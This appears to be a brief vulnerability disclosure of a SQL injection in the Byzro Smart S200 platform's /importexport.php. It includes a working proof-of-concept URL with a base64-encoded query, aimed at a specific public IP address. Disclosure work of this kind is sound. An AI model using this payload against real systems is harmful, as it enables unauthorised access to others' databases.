Byzro Networks Smart S200 management platform has a front-end sql injection vulnerability.

version:Smart S200

Vulnerability location:/importexport.php

Vulnerability recurrence


1. The login interface is as shown in the figure.
Ip：https://113.140.35.86:8443/

![image](https://github.com/tldjgggg/cve/assets/143586988/af83db0f-e44f-4b1e-85ca-bf075759e2a5)


2、Construct POC and successfully obtain database name and version

https://113.140.35.86:8443/importexport.php?sql=c2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCk=&type=exportexcelbysql

![image](https://github.com/tldjgggg/cve/assets/143586988/f312bd6e-cb56-4e30-9ecf-94d44343191f)
